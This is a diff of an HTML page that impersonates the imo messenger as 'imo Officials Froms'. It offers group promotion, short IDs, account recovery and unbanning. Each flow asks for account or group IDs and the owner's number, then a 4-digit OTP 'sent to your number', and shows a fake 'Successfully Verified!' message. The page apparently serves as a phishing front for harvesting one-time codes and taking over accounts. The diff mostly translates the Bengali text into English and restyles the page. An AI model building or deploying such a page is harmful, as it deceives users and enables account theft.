+        .modal-c5 .limit-btn:hover, .modal-c5 .limit-btn.active { background: rgba(var(--c5-rgb), 0.15); border-color: var(--c5); color: var(--c5); box-shadow: 0 0 15px rgba(var(--c5-rgb), 0.25); text-shadow: 0 0 10px rgba(var(--c5-rgb), 0.4); }
 
         .btn-submit {
-            width: 100%; padding: 15px; border: none; border-radius: 12px; font-family: 'Inter', 'Hind Siliguri', 'Noto Sans Arabic', sans-serif;
-            font-size: 1.1rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; cursor: pointer;
-            color: #000; transition: all 0.3s ease; position: relative; overflow: hidden; margin-top: 10px;
+            width: 100%; padding: 16px; border: none; border-radius: 12px; 
+            font-family: 'Inter', 'Hind Siliguri', 'Noto Sans Arabic', sans-serif;
+            font-size: 1.1rem; font-weight: 700; text-transform: uppercase; 
+            letter-spacing: 0.5px; cursor: pointer;
+            color: #000; transition: all 0.3s ease; position: relative; 
+            overflow: hidden; margin-top: 10px;
         }
-        
-        .modal-c1 .btn-submit { background: var(--c1); box-shadow: 0 0 20px rgba(var(--c1-rgb), 0.4); }
-        .modal-c2 .btn-submit { background: var(--c2); box-shadow: 0 0 20px rgba(var(--c2-rgb), 0.4); }
-        .modal-c3 .btn-submit { background: var(--c3); box-shadow: 0 0 20px rgba(var(--c3-rgb), 0.4); }
-        .modal-c4 .btn-submit { background: var(--c4); box-shadow: 0 0 20px rgba(var(--c4-rgb), 0.4); }
-        .modal-c5 .btn-submit { background: var(--c5); box-shadow: 0 0 20px rgba(var(--c5-rgb), 0.4); }
-        
+        .modal-c1 .btn-submit { background: var(--c1); box-shadow: 0 0 25px rgba(var(--c1-rgb), 0.5); }
+        .modal-c2 .btn-submit { background: var(--c2); box-shadow: 0 0 25px rgba(var(--c2-rgb), 0.5); }
+        .modal-c3 .btn-submit { background: var(--c3); box-shadow: 0 0 25px rgba(var(--c3-rgb), 0.5); }
+        .modal-c4 .btn-submit { background: var(--c4); box-shadow: 0 0 25px rgba(var(--c4-rgb), 0.5); }
+        .modal-c5 .btn-submit { background: var(--c5); box-shadow: 0 0 25px rgba(var(--c5-rgb), 0.5); }
         .btn-submit:hover { transform: translateY(-2px); filter: brightness(1.2); }
         .btn-submit:active { transform: translateY(0); }
 
-        /* =========================================
-           OTP AUTO-VERIFY MODAL SPECIFIC STYLES
-           ========================================= */
+        /* OTP */
         .otp-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; margin-top: 15px; }
         .otp-box {
-            width: 60px; height: 65px; background: rgba(0,0,0,0.5); border: 1.5px solid rgba(255,255,255,0.1);
-            border-radius: 14px; text-align: center; font-size: 1.8rem; font-weight: 700; color: #fff; 
-            outline: none; transition: all 0.3s ease; font-family: 'Space Grotesk', sans-serif;
+            width: 62px; height: 68px; background: rgba(0,0,0,0.5); 
+            border: 1.5px solid rgba(255,255,255,0.1);
+            border-radius: 14px; text-align: center; font-size: 1.8rem; 
+            font-weight: 700; color: #fff; 
+            outline: none; transition: all 0.3s ease; 
+            font-family: 'Space Grotesk', sans-serif;
         }
-        
-        .modal-c1 .otp-box:focus { border-color: var(--c1); box-shadow: 0 0 20px rgba(var(--c1-rgb), 0.3); background: rgba(0,0,0,0.8); }
-        .modal-c2 .otp-box:focus { border-color: var(--c2); box-shadow: 0 0 20px rgba(var(--c2-rgb), 0.3); background: rgba(0,0,0,0.8); }
-        .modal-c3 .otp-box:focus { border-color: var(--c3); box-shadow: 0 0 20px rgba(var(--c3-rgb), 0.3); background: rgba(0,0,0,0.8); }
-        .modal-c4 .otp-box:focus { border-color: var(--c4); box-shadow: 0 0 20px rgba(var(--c4-rgb), 0.3); background: rgba(0,0,0,0.8); }
-        .modal-c5 .otp-box:focus { border-color: var(--c5); box-shadow: 0 0 20px rgba(var(--c5-rgb), 0.3); background: rgba(0,0,0,0.8); }
-        
-        /* Loading State */
+        .modal-c1 .otp-box:focus { border-color: var(--c1); box-shadow: 0 0 25px rgba(var(--c1-rgb), 0.35); background: rgba(0,0,0,0.8); transform: scale(1.05); }
+        .modal-c2 .otp-box:focus { border-color: var(--c2); box-shadow: 0 0 25px rgba(var(--c2-rgb), 0.35); background: rgba(0,0,0,0.8); transform: scale(1.05); }
+        .modal-c3 .otp-box:focus { border-color: var(--c3); box-shadow: 0 0 25px rgba(var(--c3-rgb), 0.35); background: rgba(0,0,0,0.8); transform: scale(1.05); }
+        .modal-c4 .otp-box:focus { border-color: var(--c4); box-shadow: 0 0 25px rgba(var(--c4-rgb), 0.35); background: rgba(0,0,0,0.8); transform: scale(1.05); }
+        .modal-c5 .otp-box:focus { border-color: var(--c5); box-shadow: 0 0 25px rgba(var(--c5-rgb), 0.35); background: rgba(0,0,0,0.8); transform: scale(1.05); }
+
         .verify-loading { display: none; flex-direction: column; align-items: center; justify-content: center; gap: 15px; margin-top: 20px; }
-        
         .modal-c1 .spinner { border: 3px solid rgba(var(--c1-rgb), 0.2); border-top: 3px solid var(--c1); }
         .modal-c2 .spinner { border: 3px solid rgba(var(--c2-rgb), 0.2); border-top: 3px solid var(--c2); }
         .modal-c3 .spinner { border: 3px solid rgba(var(--c3-rgb), 0.2); border-top: 3px solid var(--c3); }
         .modal-c4 .spinner { border: 3px solid rgba(var(--c4-rgb), 0.2); border-top: 3px solid var(--c4); }
         .modal-c5 .spinner { border: 3px solid rgba(var(--c5-rgb), 0.2); border-top: 3px solid var(--c5); }
-        
-        .spinner { width: 40px; height: 40px; border-radius: 50%; animation: spin 1s linear infinite; }
+        .spinner { width: 45px; height: 45px; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        /* Success State */
+
         .verify-success {
             display: none; flex-direction: column; align-items: center; justify-content: center; gap: 15px; margin-top: 20px;
             animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
-        
-        .modal-c1 .success-icon { background: rgba(var(--c1-rgb), 0.1); border: 2px solid var(--c1); color: var(--c1); box-shadow: 0 0 20px rgba(var(--c1-rgb), 0.3); }
-        .modal-c2 .success-icon { background: rgba(var(--c2-rgb), 0.1); border: 2px solid var(--c2); color: var(--c2); box-shadow: 0 0 20px rgba(var(--c2-rgb), 0.3); }
-        .modal-c3 .success-icon { background: rgba(var(--c3-rgb), 0.1); border: 2px solid var(--c3); color: var(--c3); box-shadow: 0 0 20px rgba(var(--c3-rgb), 0.3); }
-        .modal-c4 .success-icon { background: rgba(var(--c4-rgb), 0.1); border: 2px solid var(--c4); color: var(--c4); box-shadow: 0 0 20px rgba(var(--c4-rgb), 0.3); }
-        .modal-c5 .success-icon { background: rgba(var(--c4-rgb), 0.1); border: 2px solid var(--c4); color: var(--c4); box-shadow: 0 0 20px rgba(var(--c4-rgb), 0.3); }
-
-        .success-icon { width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem; }
-        
-        .modal-c1 .success-text { color: var(--c1); }
-        .modal-c2 .success-text { color: var(--c2); }
-        .modal-c3 .success-text { color: var(--c3); }
-        .modal-c4 .success-text { color: var(--c4); }
+        .modal-c1 .success-icon { background: rgba(var(--c1-rgb), 0.1); border: 2px solid var(--c1); color: var(--c1); box-shadow: 0 0 25px rgba(var(--c1-rgb), 0.35); }
+        .modal-c2 .success-icon { background: rgba(var(--c2-rgb), 0.1); border: 2px solid var(--c2); color: var(--c2); box-shadow: 0 0 25px rgba(var(--c2-rgb), 0.35); }
+        .modal-c3 .success-icon { background: rgba(var(--c3-rgb), 0.1); border: 2px solid var(--c3); color: var(--c3); box-shadow: 0 0 25px rgba(var(--c3-rgb), 0.35); }
+        .modal-c4 .success-icon { background: rgba(var(--c4-rgb), 0.1); border: 2px solid var(--c4); color: var(--c4); box-shadow: 0 0 25px rgba(var(--c4-rgb), 0.35); }
+        .modal-c5 .success-icon { background: rgba(var(--c4-rgb), 0.1); border: 2px solid var(--c4); color: var(--c4); box-shadow: 0 0 25px rgba(var(--c4-rgb), 0.35); }
+        .success-icon { width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem; }
+        .modal-c1 .success-text { color: var(--c1); } .modal-c2 .success-text { color: var(--c2); }
+        .modal-c3 .success-text { color: var(--c3); } .modal-c4 .success-text { color: var(--c4); }
         .modal-c5 .success-text { color: var(--c4); }
-        
         .success-text { font-size: 1rem; font-weight: 600; }
-        
         @keyframes popIn { 0% { transform: scale(0.5); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
 
-        /* --- Animations --- */
         @keyframes spinBorder { 100% { transform: rotate(360deg); } }
         @keyframes slideUpFade { 100% { opacity: 1; transform: translateY(0); } }
-        
         body.modal-open { overflow: hidden; }
+
+        /* Mobile adjustments */
+        @media (max-width: 480px) {
+            h1 { font-size: 1.4rem; }
+            .modal-box { padding: 25px 20px; max-width: 100%; }
+            .otp-box { width: 55px; height: 62px; font-size: 1.5rem; }
+            .lang-selector { top: 15px; right: 15px; }
+            body[dir="rtl"] .lang-selector { right: auto; left: 15px; }
+        }
     </style>
 </head>
 <body>
 
-    <!-- Advanced Background Engine -->
     <div class="bg-container">
         <div class="bg-image"></div>
         <div class="bg-overlay"></div>
         <canvas id="particle-canvas"></canvas>
     </div>
-    
-    <!-- Custom Cursor Glow -->
     <div class="cursor-glow"></div>
 
-    <!-- Advanced Custom Language Selector -->
     <div class="lang-selector" id="langSelector">
         <div class="lang-trigger" onclick="toggleLangDropdown(event)">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
@@ -407,147 +436,126 @@
             <svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
         </div>
         <div class="lang-dropdown" id="langDropdown">
-            <div class="lang-option" data-lang="en" onclick="changeLanguage('en')">🇺🇸 English</div>
+            <div class="lang-option active" data-lang="en" onclick="changeLanguage('en')">🇺🇸 English</div>
             <div class="lang-option" data-lang="bn" onclick="changeLanguage('bn')">🇧🇩 বাংলা</div>
             <div class="lang-option" data-lang="hi" onclick="changeLanguage('hi')">🇮🇳 हिन्दी</div>
             <div class="lang-option" data-lang="ar" onclick="changeLanguage('ar')">🇸🇦 العربية</div>
         </div>
     </div>
 
-    <!-- Main App Interface -->
     <main class="app-container">
         <h1 data-i18n="title">imo Officials Froms</h1>
         
         <div class="grid-container">
-            
-            <!-- Card 1: Imo Group Promote -->
             <div class="card-wrapper c1">
                 <div class="card" onclick="openModal('modal-1')">
                     <div class="card-sheen"></div>
                     <div class="card-content">
-                        <div class="icon-wrapper">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m3 11 18-5v12L3 14v-3z"/><path d="M11.6 16.8a3 3 0 1 1-5.8-1.6"/></svg>
-                        </div>
+                        <div class="icon-wrapper"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m3 11 18-5v12L3 14v-3z"/><path d="M11.6 16.8a3 3 0 1 1-5.8-1.6"/></svg></div>
                         <div class="card-text" data-i18n="card_promote">Imo Group Promote</div>
                     </div>
                 </div>
             </div>
-
-            <!-- Card 2: Imo Group Short ID -->
             <div class="card-wrapper c2">
                 <div class="card" onclick="openModal('modal-2')">
                     <div class="card-sheen"></div>
                     <div class="card-content">
-                        <div class="icon-wrapper">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-                        </div>
+                        <div class="icon-wrapper"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg></div>
                         <div class="card-text" data-i18n="card_shortid">Imo Group Short ID</div>
                     </div>
                 </div>
             </div>
-
-            <!-- Card 3: Imo Account Hrad -->
             <div class="card-wrapper c3">
                 <div class="card" onclick="openModal('modal-3')">
                     <div class="card-sheen"></div>
                     <div class="card-content">
-                        <div class="icon-wrapper">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
-                        </div>
+                        <div class="icon-wrapper"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
                         <div class="card-text" data-i18n="card_hrad">Imo Account Hrad</div>
                     </div>
                 </div>
             </div>
-
-            <!-- Card 4: Imo account/group unbanned -->
             <div class="card-wrapper c4">
                 <div class="card" onclick="openModal('modal-4')">
                     <div class="card-sheen"></div>
                     <div class="card-content">
-                        <div class="icon-wrapper">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg>
-                        </div>
+                        <div class="icon-wrapper"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg></div>
                         <div class="card-text" data-i18n="card_unban">Imo account/group unbanned</div>
                     </div>
                 </div>
             </div>
-
-            <!-- Card 5: Group Limite -->
             <div class="card-wrapper c5">
                 <div class="card" onclick="openModal('modal-5')">
                     <div class="card-sheen"></div>
                     <div class="card-content">
-                        <div class="icon-wrapper">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 14 4-4"/><path d="M3.34 19a10 10 0 1 1 17.32 0"/></svg>
-                        </div>
+                        <div class="icon-wrapper"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 14 4-4"/><path d="M3.34 19a10 10 0 1 1 17.32 0"/></svg></div>
                         <div class="card-text" data-i18n="card_limit">Group limite</div>
                     </div>
                 </div>
             </div>
-
         </div>
 
         <div class="info-panel">
             <h2 data-i18n="about_title">About imo</h2>
-            <p data-i18n="about_desc">imo is a leading global communication platform, offering free, high-quality HD video and voice calls to over 200 million users worldwide. Stay connected without limits!</p>
+            <p data-i18n="about_desc">imo is a leading global communication platform, offering free, high-quality HD video and voice calls to over 200 million users worldwide.</p>
         </div>
     </main>
 
-    <!-- =========================================
-         MODALS FLOW 1: PROMOTE (CYAN)
-         ========================================= -->
+    <!-- MODAL 1 -->
     <div class="modal-overlay modal-c1" id="modal-1">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="modal1_title">গ্রুপ প্রমোট রিকোয়েস্ট</div>
+                <div class="modal-title" data-i18n="modal1_title">Group Promote</div>
                 <button class="close-btn" onclick="closeModal('modal-1')">&times;</button>
             </div>
             <div class="form-group">
-                <label data-i18n="form_group_id">প্রিয় ইউজার আপনার গ্রুপটি প্রমোট করার জন্য গ্রুপ আইডি লিখুন</label>
+                <label data-i18n="form_group_id">Dear User, enter the Group ID to promote your group</label>
                 <input type="text" class="form-input" placeholder="Group ID..." data-i18n-placeholder="ph_group_id">
                 <input type="text" class="form-input" placeholder="Confirm Group ID..." data-i18n-placeholder="ph_group_id_confirm">
             </div>
             <div class="form-group">
-                <label data-i18n="form_group_name">প্রিয় ইউজার গ্রুপের নামটি লিখুন</label>
+                <label data-i18n="form_group_name">Dear User, enter the Group Name</label>
                 <input type="text" class="form-input" placeholder="Group Name..." data-i18n-placeholder="ph_group_name">
                 <input type="text" class="form-input" placeholder="Confirm Group Name..." data-i18n-placeholder="ph_group_name_confirm">
             </div>
             <div class="form-group" style="margin-bottom: 10px;">
-                <label data-i18n="form_promote_days">প্রিয় ইউজার আপনি কত দিনের জন্য প্রমোট করতে চান বাছাই করুন</label>
+                <label data-i18n="form_promote_days">Dear User, select how many days you want to promote</label>
                 <div class="limit-options">
-                    <button class="limit-btn" onclick="selectOption(this, '1 Day')" data-i18n="opt_1_day">1 দিন</button>
-                    <button class="limit-btn" onclick="selectOption(this, '7 Days')" data-i18n="opt_7_days">7 দিন</button>
-                    <button class="limit-btn" onclick="selectOption(this, '30 Days')" data-i18n="opt_30_days">30 দিন</button>
+                    <button class="limit-btn" onclick="selectOption(this, '1 Day')" data-i18n="opt_1_day">1 Day</button>
+                    <button class="limit-btn" onclick="selectOption(this, '7 Days')" data-i18n="opt_7_days">7 Days</button>
+                    <button class="limit-btn" onclick="selectOption(this, '30 Days')" data-i18n="opt_30_days">30 Days</button>
                 </div>
             </div>
-            <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">এখন এখানে সাবমিট করুন</div>
-            <button class="btn-submit" onclick="submitFlow('promote')" data-i18n="btn_submit">সাবমিট</button>
+            <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">Now submit here</div>
+            <button class="btn-submit" onclick="fastSubmitFlow('promote')" data-i18n="btn_submit">Submit</button>
         </div>
     </div>
 
     <div class="modal-overlay modal-c1" id="modal-1-5">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="owner_title">ওনার ভেরিফিকেশন</div>
+                <div class="modal-title" data-i18n="user_verify_title">User Verification</div>
                 <button class="close-btn" onclick="closeModal('modal-1-5')">&times;</button>
             </div>
-            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="owner_desc">আপনার গ্রুপ প্রমোট রিকোয়েস্টটি কনফার্ম করার জন্য গ্রুপের ওনার আইডি দিয়ে ভেরিফাই করুন</p>
+            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="user_verify_desc">To confirm your request, please verify with your User Name and User Account Number</p>
             <div class="form-group">
-                <label data-i18n="owner_id">গ্রুপের ওনার আইডির নাম্বার</label>
-                <input type="text" class="form-input" placeholder="Owner ID Number..." data-i18n-placeholder="ph_owner_id">
-                <input type="text" class="form-input" placeholder="Confirm Owner ID Number..." data-i18n-placeholder="ph_owner_id_confirm">
+                <label data-i18n="user_name">User Name (Any Name)</label>
+                <input type="text" class="form-input" placeholder="Enter any User Name..." data-i18n-placeholder="ph_user_name">
             </div>
-            <button class="btn-submit" onclick="submitOwnerId('promote')" data-i18n="btn_send_id">নাম্বার সেন্ড করুন</button>
+            <div class="form-group">
+                <label data-i18n="user_account">User Account Number (Any Number)</label>
+                <input type="text" class="form-input" placeholder="Enter any Account Number..." data-i18n-placeholder="ph_user_account">
+            </div>
+            <button class="btn-submit" onclick="fastSubmitVerification('promote')" data-i18n="btn_send_verify">Verify Now</button>
         </div>
     </div>
 
     <div class="modal-overlay modal-c1" id="modal-1-7">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="otp_title">OTP ভেরিফিকেশন</div>
+                <div class="modal-title" data-i18n="otp_title">OTP Verification</div>
                 <button class="close-btn" onclick="closeModal('modal-1-7')">&times;</button>
             </div>
-            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">গ্রুপ ওনার নাম্বারে পাঠানো ৪ ডিজিটের কোডটি দিন</p>
+            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">Enter the 4-digit code sent to your number</p>
             <div class="otp-container" id="otp-inputs-promote">
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
@@ -555,70 +563,71 @@
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
             </div>
             <div class="verify-loading" id="verify-loading-promote">
-                <div class="spinner"></div><span style="color: var(--c1); font-size: 0.9rem;" data-i18n="otp_verifying">ভেরিফাই করা হচ্ছে...</span>
+                <div class="spinner"></div><span style="color: var(--c1); font-size: 0.9rem;" data-i18n="otp_verifying">Verifying...</span>
             </div>
             <div class="verify-success" id="verify-success-promote">
-                <div class="success-icon">✓</div><span class="success-text" data-i18n="otp_success">সফলভাবে ভেরিফাইড!</span>
+                <div class="success-icon">✓</div><span class="success-text" data-i18n="otp_success">Successfully Verified!</span>
             </div>
-            <button class="btn-submit" id="otp-submit-btn-promote" onclick="autoVerify('promote')" data-i18n="btn_verify">ভেরিফাই করুন</button>
+            <button class="btn-submit" id="otp-submit-btn-promote" onclick="autoVerify('promote')" data-i18n="btn_verify">Verify</button>
         </div>
     </div>
 
-    <!-- =========================================
-         MODALS FLOW 2: SHORT ID (PURPLE)
-         ========================================= -->
+    <!-- MODAL 2 -->
     <div class="modal-overlay modal-c2" id="modal-2">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="modal2_title">শর্ট আইডি রিকোয়েস্ট</div>
+                <div class="modal-title" data-i18n="modal2_title">Short ID Request</div>
                 <button class="close-btn" onclick="closeModal('modal-2')">&times;</button>
             </div>
             <div class="form-group">
-                <label data-i18n="form_shortid_id">প্রিয় ইউজার আপনার গ্রুপের শর্ট আইডি পেতে গ্রুপ আইডি লিখুন</label>
+                <label data-i18n="form_shortid_id">Dear User, enter the Group ID to get a Short ID</label>
                 <input type="text" class="form-input" placeholder="Group ID..." data-i18n-placeholder="ph_group_id">
                 <input type="text" class="form-input" placeholder="Confirm Group ID..." data-i18n-placeholder="ph_group_id_confirm">
             </div>
             <div class="form-group">
-                <label data-i18n="form_group_name">প্রিয় ইউজার গ্রুপের নামটি লিখুন</label>
+                <label data-i18n="form_group_name">Dear User, enter the Group Name</label>
                 <input type="text" class="form-input" placeholder="Group Name..." data-i18n-placeholder="ph_group_name">
                 <input type="text" class="form-input" placeholder="Confirm Group Name..." data-i18n-placeholder="ph_group_name_confirm">
             </div>
             <div class="form-group" style="margin-bottom: 10px;">
-                <label data-i18n="form_shortid_type">প্রিয় ইউজার শর্ট আইডির ধরন বাছাই করুন</label>
+                <label data-i18n="form_shortid_type">Dear User, select the type of Short ID</label>
                 <div class="limit-options">
-                    <button class="limit-btn" onclick="selectOption(this, '3 Digit')" data-i18n="opt_3_digit">3 ডিজিট</button>
-                    <button class="limit-btn" onclick="selectOption(this, '4 Digit')" data-i18n="opt_4_digit">4 ডিজিট</button>
-                    <button class="limit-btn" onclick="selectOption(this, '5 Digit')" data-i18n="opt_5_digit">5 ডিজিট</button>
+                    <button class="limit-btn" onclick="selectOption(this, '3 Digit')" data-i18n="opt_3_digit">3 Digit</button>
+                    <button class="limit-btn" onclick="selectOption(this, '4 Digit')" data-i18n="opt_4_digit">4 Digit</button>
+                    <button class="limit-btn" onclick="selectOption(this, '5 Digit')" data-i18n="opt_5_digit">5 Digit</button>
                 </div>
             </div>
-            <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">এখন এখানে সাবমিট করুন</div>
-            <button class="btn-submit" onclick="submitFlow('shortid')" data-i18n="btn_submit">সাবমিট</button>
+            <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">Now submit here</div>
+            <button class="btn-submit" onclick="fastSubmitFlow('shortid')" data-i18n="btn_submit">Submit</button>
         </div>
     </div>
 
     <div class="modal-overlay modal-c2" id="modal-2-5">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="owner_title">ওনার ভেরিফিকেশন</div>
+                <div class="modal-title" data-i18n="user_verify_title">User Verification</div>
                 <button class="close-btn" onclick="closeModal('modal-2-5')">&times;</button>
             </div>
-            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="owner_desc_shortid">আপনার শর্ট আইডি রিকোয়েস্টটি কনফার্ম করার জন্য গ্রুপের ওনার আইডি দিয়ে ভেরিফাই করুন</p>
+            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="user_verify_desc">To confirm your request, please verify with your User Name and User Account Number</p>
             <div class="form-group">
-                <label data-i18n="owner_id">গ্রুপের ওনার আইডির নাম্বার</label>
-                <input type="text" class="form-input" placeholder="Owner ID Number..." data-i18n-placeholder="ph_owner_id">
-                <input type="text" class="form-input" placeholder="Confirm Owner ID Number..." data-i18n-placeholder="ph_owner_id_confirm">
+                <label data-i18n="user_name">User Name (Any Name)</label>
+                <input type="text" class="form-input" placeholder="Enter any User Name..." data-i18n-placeholder="ph_user_name">
             </div>
-            <button class="btn-submit" onclick="submitOwnerId('shortid')" data-i18n="btn_send_id">নাম্বার সেন্ড করুন</button>
+            <div class="form-group">
+                <label data-i18n="user_account">User Account Number (Any Number)</label>
+                <input type="text" class="form-input" placeholder="Enter any Account Number..." data-i18n-placeholder="ph_user_account">
+            </div>
+            <button class="btn-submit" onclick="fastSubmitVerification('shortid')" data-i18n="btn_send_verify">Verify Now</button>
         </div>
     </div>
 
     <div class="modal-overlay modal-c2" id="modal-2-7">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="otp_title">OTP ভেরিফিকেশন</div>
+                <div class="modal-title" data-i18n="otp_title">OTP Verification</div>
                 <button class="close-btn" onclick="closeModal('modal-2-7')">&times;</button>
             </div>
-            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">গ্রুপ ওনার নাম্বারে পাঠানো ৪ ডিজিটের কোডটি দিন</p>
+            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">Enter the 4-digit code sent to your number</p>
             <div class="otp-container" id="otp-inputs-shortid">
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
@@ -626,70 +635,71 @@
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
             </div>
             <div class="verify-loading" id="verify-loading-shortid">
-                <div class="spinner"></div><span style="color: var(--c2); font-size: 0.9rem;" data-i18n="otp_verifying">ভেরিফাই করা হচ্ছে...</span>
+                <div class="spinner"></div><span style="color: var(--c2); font-size: 0.9rem;" data-i18n="otp_verifying">Verifying...</span>
             </div>
             <div class="verify-success" id="verify-success-shortid">
-                <div class="success-icon">✓</div><span class="success-text" data-i18n="otp_success">সফলভাবে ভেরিফাইড!</span>
+                <div class="success-icon">✓</div><span class="success-text" data-i18n="otp_success">Successfully Verified!</span>
             </div>
-            <button class="btn-submit" id="otp-submit-btn-shortid" onclick="autoVerify('shortid')" data-i18n="btn_verify">ভেরিফাই করুন</button>
+            <button class="btn-submit" id="otp-submit-btn-shortid" onclick="autoVerify('shortid')" data-i18n="btn_verify">Verify</button>
         </div>
     </div>
 
-    <!-- =========================================
-         MODALS FLOW 3: HRAD (PINK)
-         ========================================= -->
+    <!-- MODAL 3 -->
     <div class="modal-overlay modal-c3" id="modal-3">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="modal3_title">অ্যাকাউন্ট রিকভারি (Hrad)</div>
+                <div class="modal-title" data-i18n="modal3_title">Account Recovery</div>
                 <button class="close-btn" onclick="closeModal('modal-3')">&times;</button>
             </div>
             <div class="form-group">
-                <label data-i18n="form_hrad_id">প্রিয় ইউজার আপনার অ্যাকাউন্ট আইডি লিখুন</label>
+                <label data-i18n="form_hrad_id">Dear User, enter your Account ID</label>
                 <input type="text" class="form-input" placeholder="Account ID..." data-i18n-placeholder="ph_account_id">
                 <input type="text" class="form-input" placeholder="Confirm Account ID..." data-i18n-placeholder="ph_account_id_confirm">
             </div>
             <div class="form-group">
-                <label data-i18n="form_hrad_name">প্রিয় ইউজার অ্যাকাউন্টের নাম লিখুন</label>
+                <label data-i18n="form_hrad_name">Dear User, enter your Account Name</label>
                 <input type="text" class="form-input" placeholder="Account Name..." data-i18n-placeholder="ph_account_name">
                 <input type="text" class="form-input" placeholder="Confirm Account Name..." data-i18n-placeholder="ph_account_name_confirm">
             </div>
             <div class="form-group" style="margin-bottom: 10px;">
-                <label data-i18n="form_hrad_issue">প্রিয় ইউজার সমস্যার ধরন বাছাই করুন</label>
+                <label data-i18n="form_hrad_issue">Dear User, select the type of issue</label>
                 <div class="limit-options">
